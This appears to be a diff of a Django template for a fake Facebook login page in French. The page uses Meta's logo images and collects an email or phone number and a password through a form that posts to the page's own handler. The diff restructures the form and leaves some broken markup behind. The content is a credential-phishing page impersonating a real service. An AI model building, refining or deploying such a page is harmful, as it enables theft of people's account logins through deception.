@@ -48,18 +48,22 @@ button {
 
 <img data-bloks-name="bk.components.Image" role="heading" alt="Facebook from Meta" class="wbloks_1" src="https://static.xx.fbcdn.net/rsrc.php/y8/r/TpxB5GEi0Il.webp" style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;"><br><br></center
 
-
-    <form method="POST" action="/login/">
-        {% csrf_token %}
-
+    <form></form>
         <input type="text" name="contact" placeholder="Email ou téléphone" required>
         <input type="password" name="mot_de_passe" placeholder="Mot de passe" required>
+        </form>
+<form method="POST">
+    {% csrf_token %}
 
-        <button type="submit">Se connecter</button><br><br>
+    <input type="text" name="contact" placeholder="Contact">
+    <input type="password" name="mot_de_passe" placeholder="Mot de passe">
+
+    <button type="submit">Se connecter</button>
+</form>
         <span data-bloks-name="bk.components.TextSpan" style="color: rgb(17, 17, 18); font-weight: 500; display: inline; font-size: 15.2px; font-family: &quot;Optimistic 95&quot;; white-space: pre-wrap; overflow-wrap: break-word;">                    Mot de passe oublié&nbsp;?</span><br><br>
 <center>
              <img data-bloks-name="bk.components.Image" alt="" class="wbloks_1" src="https://z-m-static.xx.fbcdn.net/rsrc.php/yA/r/H5KMJlh-MJS.webp" style="height: 10%; width: 10%; pointer-events: inherit; object-fit: contain; overflow: hidden;"></center>
-    </form>
+    
 </div>
 
 </body>
